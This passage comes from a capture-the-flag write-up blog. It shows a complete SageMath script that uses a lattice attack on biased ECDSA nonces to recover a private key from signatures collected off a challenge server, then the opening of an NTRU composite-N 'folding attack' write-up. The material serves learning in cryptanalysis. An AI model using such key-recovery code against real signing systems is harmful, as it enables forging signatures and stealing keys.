<span class="n">E</span> <span class="o">=</span> <span class="n">EllipticCurve</span><span class="p">(</span><span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">))</span>
<span class="n">G</span> <span class="o">=</span> <span class="n">E</span><span class="p">(</span><span class="mh">0xaa87ca22be8b05378eb1c71ef320ad746e1d3b628ba79b9859f741e082542a385502f25dbf55296c3a545e3872760ab7</span><span class="p">,</span> <span class="mh">0x3617de4a96262c6f5d9e98bf9292dc29f8f41dbd289a147ce9da3113b5f0b8c00a60b1ce1d7e819d7a431d7c90ea0e5f</span><span class="p">)</span>

<span class="n">TARGET</span> <span class="o">=</span> <span class="mi">384</span> <span class="o">-</span> <span class="mi">26</span>
<span class="n">MAX_SIGNS</span> <span class="o">=</span> <span class="mi">15</span>

<span class="c1"># Bruteforced message in c++, 26 leading 0s in sha384(m)
</span><span class="n">m_list</span> <span class="o">=</span> <span class="p">[</span><span class="s">"5831510802864336587"</span><span class="p">]</span> <span class="o">*</span> <span class="mi">15</span>
<span class="n">h_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">r_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">s_list</span> <span class="o">=</span> <span class="p">[]</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"redacted.chall.nnsc.tf"</span><span class="p">,</span> <span class="mi">41337</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"friends.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">m_list</span><span class="p">:</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">r</span><span class="p">,</span><span class="n">s</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"="</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">":"</span><span class="p">)</span>
    <span class="n">r_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">strip</span><span class="p">()))</span>
    <span class="n">s_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">strip</span><span class="p">()))</span>
    <span class="n">h_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">sha384</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">()))</span>
<span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">shortest_vectors</span><span class="p">(</span><span class="n">B</span><span class="p">):</span>
    <span class="n">B</span> <span class="o">=</span> <span class="n">B</span><span class="p">.</span><span class="n">LLL</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">B</span><span class="p">.</span><span class="n">rows</span><span class="p">():</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">row</span><span class="p">.</span><span class="n">is_zero</span><span class="p">():</span>
            <span class="k">yield</span> <span class="n">row</span>

<span class="k">class</span> <span class="nc">PartialInteger</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">mask</span><span class="p">,</span> <span class="n">bits</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">v</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">m</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">mask</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">bit_length</span> <span class="o">=</span> <span class="n">bits</span>

    <span class="k">def</span> <span class="nf">get_known_msb</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">msb_val</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">msb_len</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">bit_length</span><span class="p">)):</span>
            <span class="k">if</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">m</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>       
                <span class="n">msb_val</span> <span class="o">=</span> <span class="p">(</span><span class="n">msb_val</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="bp">self</span><span class="p">.</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
                <span class="n">msb_len</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="k">else</span><span class="p">:</span>                                
                <span class="k">break</span>
        <span class="k">return</span> <span class="n">msb_val</span><span class="p">,</span> <span class="n">msb_len</span>

    <span class="k">def</span> <span class="nf">get_unknown_lsb</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">lsb_len</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">bit_length</span><span class="p">):</span>
            <span class="k">if</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">m</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">:</span>        
                <span class="k">break</span>
            <span class="n">lsb_len</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">return</span> <span class="n">lsb_len</span>

    <span class="k">def</span> <span class="nf">sub</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">parts</span><span class="p">):</span>
        <span class="n">low</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">lsb_len</span>  <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">get_unknown_lsb</span><span class="p">())</span>
        <span class="n">mask_lsb</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">lsb_len</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>      
        <span class="k">return</span> <span class="n">Integer</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">v</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">mask_lsb</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">low</span> <span class="o">&amp;</span> <span class="n">mask_lsb</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">__repr__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">bits</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">reversed</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">to_bits_le</span><span class="p">()))</span>
        <span class="k">return</span> <span class="sa">f</span><span class="s">"&lt;PartialInteger </span><span class="si">{</span><span class="n">bits</span><span class="si">}</span><span class="s">&gt;"</span>

    <span class="k">def</span> <span class="nf">to_bits_le</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">[</span>
            <span class="nb">str</span><span class="p">((</span><span class="bp">self</span><span class="p">.</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="k">if</span> <span class="p">((</span><span class="bp">self</span><span class="p">.</span><span class="n">m</span> <span class="o">&gt;&gt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="k">else</span> <span class="s">'?'</span>
            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">bit_length</span><span class="p">)</span>
        <span class="p">]</span>

<span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">X</span><span class="p">):</span>
    <span class="n">n1</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">n2</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">B</span> <span class="o">=</span> <span class="n">matrix</span><span class="p">(</span><span class="n">QQ</span><span class="p">,</span> <span class="n">n1</span> <span class="o">+</span> <span class="n">n2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">n1</span> <span class="o">+</span> <span class="n">n2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n1</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n2</span><span class="p">):</span>
            <span class="n">B</span><span class="p">[</span><span class="n">n1</span> <span class="o">+</span> <span class="n">j</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span>

        <span class="n">B</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">m</span>
        <span class="n">B</span><span class="p">[</span><span class="n">n1</span> <span class="o">+</span> <span class="n">n2</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="n">X</span> <span class="o">//</span> <span class="mi">2</span>

    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n2</span><span class="p">):</span>
        <span class="n">B</span><span class="p">[</span><span class="n">n1</span> <span class="o">+</span> <span class="n">j</span><span class="p">,</span> <span class="n">n1</span> <span class="o">+</span> <span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">X</span> <span class="o">/</span> <span class="n">QQ</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>

    <span class="n">B</span><span class="p">[</span><span class="n">n1</span> <span class="o">+</span> <span class="n">n2</span><span class="p">,</span> <span class="n">n1</span> <span class="o">+</span> <span class="n">n2</span><span class="p">]</span> <span class="o">=</span> <span class="n">X</span>

    <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">shortest_vectors</span><span class="p">(</span><span class="n">B</span><span class="p">):</span>
        <span class="n">xs</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">X</span> <span class="o">//</span> <span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n1</span><span class="p">)]</span>
        <span class="n">ys</span> <span class="o">=</span> <span class="p">[(</span><span class="nb">int</span><span class="p">(</span><span class="n">v</span><span class="p">[</span><span class="n">n1</span> <span class="o">+</span> <span class="n">j</span><span class="p">]</span> <span class="o">*</span> <span class="n">m</span><span class="p">)</span> <span class="o">//</span> <span class="n">X</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n2</span><span class="p">)]</span>
        <span class="k">if</span> <span class="nb">all</span><span class="p">(</span><span class="n">y</span> <span class="o">!=</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="n">ys</span><span class="p">)</span> <span class="ow">and</span> <span class="n">v</span><span class="p">[</span><span class="n">n1</span> <span class="o">+</span> <span class="n">n2</span><span class="p">]</span> <span class="o">==</span> <span class="n">X</span><span class="p">:</span>
            <span class="k">yield</span> <span class="n">xs</span><span class="p">,</span> <span class="n">ys</span>


<span class="k">def</span> <span class="nf">dsa_known_msb</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">h</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">k</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">b</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">X</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">hi</span><span class="p">,</span> <span class="n">ri</span><span class="p">,</span> <span class="n">si</span><span class="p">,</span> <span class="n">ki</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">k</span><span class="p">):</span>
        <span class="n">msb</span><span class="p">,</span> <span class="n">msb_bit_length</span> <span class="o">=</span> <span class="n">ki</span><span class="p">.</span><span class="n">get_known_msb</span><span class="p">()</span>
        <span class="n">shift</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">**</span> <span class="n">ki</span><span class="p">.</span><span class="n">get_unknown_lsb</span><span class="p">()</span>
        <span class="n">a</span><span class="p">.</span><span class="n">append</span><span class="p">([(</span><span class="nb">pow</span><span class="p">(</span><span class="n">si</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">*</span> <span class="n">ri</span><span class="p">)</span> <span class="o">%</span> <span class="n">n</span><span class="p">])</span>
        <span class="n">b</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="nb">pow</span><span class="p">(</span><span class="n">si</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">*</span> <span class="n">hi</span> <span class="o">-</span> <span class="n">shift</span> <span class="o">*</span> <span class="n">msb</span><span class="p">)</span> <span class="o">%</span> <span class="n">n</span><span class="p">)</span>
        <span class="n">X</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">shift</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">k_</span><span class="p">,</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">attack</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">X</span><span class="p">):</span>
        <span class="k">yield</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="n">ki</span><span class="p">.</span><span class="n">sub</span><span class="p">([</span><span class="n">ki_</span><span class="p">])</span> <span class="k">for</span> <span class="n">ki</span><span class="p">,</span> <span class="n">ki_</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">k_</span><span class="p">)]</span>


<span class="n">TOTAL_BITS</span> <span class="o">=</span> <span class="mi">384</span>
<span class="n">KNOWN_BITS</span> <span class="o">=</span> <span class="n">TOTAL_BITS</span> <span class="o">-</span> <span class="n">TARGET</span>
<span class="n">MASK_TOP</span> <span class="o">=</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">KNOWN_BITS</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">TOTAL_BITS</span> <span class="o">-</span> <span class="n">KNOWN_BITS</span><span class="p">)</span> 
<span class="n">KNOWN_VALUE</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># all top bits are 0
</span>
<span class="n">k_partial</span> <span class="o">=</span> <span class="p">[</span><span class="n">PartialInteger</span><span class="p">(</span><span class="n">KNOWN_VALUE</span><span class="p">,</span> <span class="n">MASK_TOP</span><span class="p">,</span> <span class="n">TOTAL_BITS</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">r_list</span><span class="p">))]</span>
<span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">dsa_known_msb</span><span class="p">(</span><span class="n">E</span><span class="p">.</span><span class="n">order</span><span class="p">(),</span> <span class="n">h_list</span><span class="p">,</span> <span class="n">r_list</span><span class="p">,</span> <span class="n">s_list</span><span class="p">,</span> <span class="n">k_partial</span><span class="p">))[</span><span class="mi">0</span><span class="p">]))</span>
</code></pre></div></div>

<h5 id="cheese">Cheese</h5>

<p>because of a skill issue on my part, i overlooked the possibility of just reconnecting to the instance to get as many signatures as you want. This means the message $m$ does not need to be bruteforced. This isn’t too big of a cheese though</p>]]></content><author><name>Zukane</name></author><category term="writeups" /><category term="ECDSA" /><category term="Biased Nonces" /><category term="Hidden Number Problem" /><summary type="html"><![CDATA[Challenge overview]]></summary></entry><entry><title type="html">Origami (NNS CTF 2025)</title><link href="https://zukane.github.io/origami/" rel="alternate" type="text/html" title="Origami (NNS CTF 2025)" /><published>2025-08-31T12:00:00+02:00</published><updated>2025-08-31T12:00:00+02:00</updated><id>https://zukane.github.io/origami</id><content type="html" xml:base="https://zukane.github.io/origami/"><![CDATA[<h5 id="challenge-overview">Challenge overview</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Origami is a ntruly marvellous artform
</code></pre></div></div>

<p>In this CTF challenge, we are given the following encryption script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>

<span class="n">n</span><span class="p">,</span><span class="n">p</span><span class="p">,</span><span class="n">q</span><span class="p">,</span><span class="n">df</span><span class="p">,</span><span class="n">dg</span><span class="p">,</span><span class="n">dr</span><span class="o">=</span><span class="p">[</span><span class="mi">512</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">22</span><span class="p">]</span>
<span class="n">R</span><span class="p">.</span><span class="o">&lt;</span><span class="n">x</span><span class="o">&gt;</span>  <span class="o">=</span> <span class="n">ZZ</span><span class="p">[]</span>
<span class="n">Rq</span><span class="p">.</span><span class="o">&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">Integers</span><span class="p">(</span><span class="n">q</span><span class="p">)[]</span>
<span class="n">Rqn</span> <span class="o">=</span> <span class="n">Rq</span><span class="p">.</span><span class="n">quotient</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="n">Rp</span><span class="p">.</span><span class="o">&lt;</span><span class="n">w</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">Integers</span><span class="p">(</span><span class="n">p</span><span class="p">)[]</span>
<span class="n">Rpn</span> <span class="o">=</span> <span class="n">Rp</span><span class="p">.</span><span class="n">quotient</span><span class="p">(</span><span class="n">w</span><span class="o">^</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">random_poly</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
    <span class="n">f</span> <span class="o">=</span> <span class="n">R</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">sample</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">),</span><span class="n">d</span><span class="p">):</span>
        <span class="n">f</span> <span class="o">+=</span> <span class="n">R</span><span class="p">(</span><span class="n">x</span><span class="o">**</span><span class="n">i</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">f</span>

<span class="k">def</span> <span class="nf">secretkey_gen</span><span class="p">():</span>
    <span class="n">f</span><span class="p">,</span><span class="n">g</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="n">Rpn</span><span class="p">(</span><span class="n">f</span><span class="p">).</span><span class="n">is_unit</span><span class="p">()</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">Rqn</span><span class="p">(</span><span class="n">f</span><span class="p">).</span><span class="n">is_unit</span><span class="p">():</span>
        <span class="n">f</span> <span class="o">=</span> <span class="n">random_poly</span><span class="p">(</span><span class="n">df</span><span class="p">)</span>
        <span class="n">g</span> <span class="o">=</span> <span class="n">random_poly</span><span class="p">(</span><span class="n">dg</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">f</span><span class="p">,</span><span class="n">g</span>

<span class="k">def</span> <span class="nf">publickey_gen</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">g</span><span class="p">):</span>
    <span class="n">h</span> <span class="o">=</span> <span class="n">Rqn</span><span class="p">(</span><span class="n">g</span><span class="p">)</span><span class="o">/</span><span class="n">Rqn</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">h</span>

<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">h</span><span class="p">,</span><span class="n">m</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">random_poly</span><span class="p">(</span><span class="n">dr</span><span class="p">)</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">h</span> <span class="o">*</span> <span class="n">Rqn</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">+</span> <span class="n">Rqn</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">c</span>
    
<span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
    <span class="n">poly</span> <span class="o">=</span> <span class="n">R</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
        <span class="n">poly</span> <span class="o">+=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">x</span><span class="o">^</span><span class="n">i</span>
        <span class="n">val</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">poly</span>

<span class="n">f</span><span class="p">,</span><span class="n">g</span> <span class="o">=</span> <span class="n">secretkey_gen</span><span class="p">()</span>
<span class="n">pk</span> <span class="o">=</span> <span class="n">publickey_gen</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">g</span><span class="p">)</span>

<span class="n">flag</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="sa">b</span><span class="s">"NNS{???????????????????????????????????????????????}"</span><span class="p">))</span>
<span class="n">ct</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">pk</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"pk = </span><span class="si">{</span><span class="n">pk</span><span class="p">.</span><span class="n">lift</span><span class="p">().</span><span class="n">coefficients</span><span class="p">(</span><span class="n">sparse</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"ct = </span><span class="si">{</span><span class="n">ct</span><span class="p">.</span><span class="n">lift</span><span class="p">().</span><span class="n">coefficients</span><span class="p">(</span><span class="n">sparse</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>as well as the output in output.txt:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pk = [126, 74, 108, 97, 86, 46, 112, 34, 101, 40, 119, 70, 112, 77, 71, 15, 77, 30, 102, 93, 64, 22, 1, 119, 35, 67, 70, 54, 45, 116, 67, 53, 55, 53, 6, 46, 72, 116, 113, 32, 55, 56, 83, 32, 10, 52, 77, 94, 61, 18, 99, 55, 65, 80, 13, 38, 17, 104, 88, 115, 24, 60, 1, 31, 65, 105, 120, 37, 91, 29, 113, 9, 108, 115, 66, 16, 33, 77, 40, 22, 122, 74, 18, 63, 6, 17, 124, 110, 71, 93, 106, 74, 25, 108, 24, 119, 96, 117, 10, 78, 65, 64, 115, 59, 3, 110, 39, 64, 93, 123, 88, 95, 48, 34, 86, 12, 82, 67, 117, 118, 90, 107, 12, 17, 102, 52, 0, 16, 71, 2, 26, 26, 43, 55, 113, 63, 15, 27, 48, 90, 115, 16, 25, 126, 104, 28, 12, 90, 108, 20, 108, 46, 45, 101, 88, 4, 126, 115, 32, 0, 72, 6, 5, 112, 14, 49, 58, 64, 21, 64, 90, 79, 96, 90, 71, 35, 3, 77, 5, 27, 72, 69, 70, 87, 38, 98, 46, 51, 15, 78, 90, 13, 14, 56, 120, 74, 59, 95, 56, 96, 52, 69, 45, 33, 82, 44, 111, 90, 105, 45, 45, 17, 111, 9, 58, 19, 106, 30, 66, 119, 95, 50, 21, 104, 10, 103, 93, 47, 109, 16, 5, 67, 98, 126, 13, 2, 105, 121, 40, 108, 91, 111, 96, 86, 41, 98, 10, 34, 114, 33, 15, 53, 121, 4, 115, 47]
ct = [89, 49, 11, 57, 106, 101, 122, 57, 34, 67, 63, 35, 21, 72, 84, 23, 65, 4, 91, 79, 51, 86, 68, 94, 81, 50, 102, 8, 18, 64, 28, 7, 69, 91, 82, 13, 2, 17, 29, 12, 88, 81, 98, 26, 94, 102, 18, 94, 82, 30, 79, 118, 55, 41, 101, 109, 44, 78, 124, 118, 9, 79, 110, 94, 75, 62, 52, 116, 46, 13, 55, 24, 43, 89, 46, 119, 11, 1, 33, 83, 117, 80, 35, 109, 39, 44, 114, 0, 59, 86, 13, 29, 14, 93, 124, 17, 30, 29, 67, 67, 79, 30, 46, 35, 38, 33, 58, 120, 112, 68, 74, 85, 110, 57, 27, 3, 107, 42, 70, 105, 12, 16, 101, 17, 4, 125, 19, 57, 70, 35, 114, 28, 111, 108, 123, 31, 49, 95, 74, 77, 82, 44, 123, 62, 47, 6, 87, 116, 17, 68, 39, 24, 26, 107, 75, 20, 33, 10, 17, 55, 101, 4, 115, 92, 98, 101, 22, 23, 95, 91, 19, 15, 111, 60, 29, 124, 113, 60, 28, 15, 74, 107, 76, 78, 81, 115, 118, 15, 93, 117, 72, 46, 81, 18, 44, 37, 126, 24, 77, 27, 31, 67, 99, 60, 96, 66, 93, 112, 13, 10, 91, 0, 80, 12, 67, 46, 115, 53, 37, 64, 43, 120, 116, 27, 58, 3, 62, 14, 79, 41, 39, 30, 103, 39, 50, 56, 123, 21, 2, 55, 110, 99, 100, 24, 62, 20, 10, 102, 80, 44, 51, 9, 100, 31, 79, 92]
</code></pre></div></div>

<h5 id="source-code-analysis">Source code analysis</h5>

<p>The encryption script implements NTRUEncrypt with parameters:</p>

\[\large
\begin{align}
\nonumber N &amp;= 512 \\
\nonumber p &amp;= 2 \\
\nonumber q &amp;= 127 \\
\nonumber df, dg &amp;= 35 \\
\nonumber dr &amp;= 22
\end{align}\]

<p>The only notable part is the highly composite $N=512$. Reading around, it seems that a prime $N$ isn’t completely necessary, but it is recommended. Searching for some attacks against NTRU with a composite $N$, we stumble upon the paper <code class="language-plaintext highlighter-rouge">Key Recovery and Message Attacks on NTRU-Composite</code> by Craig Gentry https://www.iacr.org/archive/eurocrypt2001/20450181.pdf. This paper details what is known as a <code class="language-plaintext highlighter-rouge">folding attack</code>, which seems like an intended approach based on the challenge name <code class="language-plaintext highlighter-rouge">Origami</code>. Section 6 of Gentry’s paper explains results of the attack on NTRU-256, where Silverman had proposed choosing $N$ to be a power of 2. In our case, $N=512$ is indeed a power of two.</p>

<h5 id="ntru-recap">NTRU recap</h5>

<p>NTRU is a set of lattice-based public key algorithms (NTRUEncrypt, NTRUSign). It represents keys and ciphertexts as short polynomials in the quotient ring:</p>

\[\large \mathbb{Z}_{q}[x]/(x^{N}-1)\]

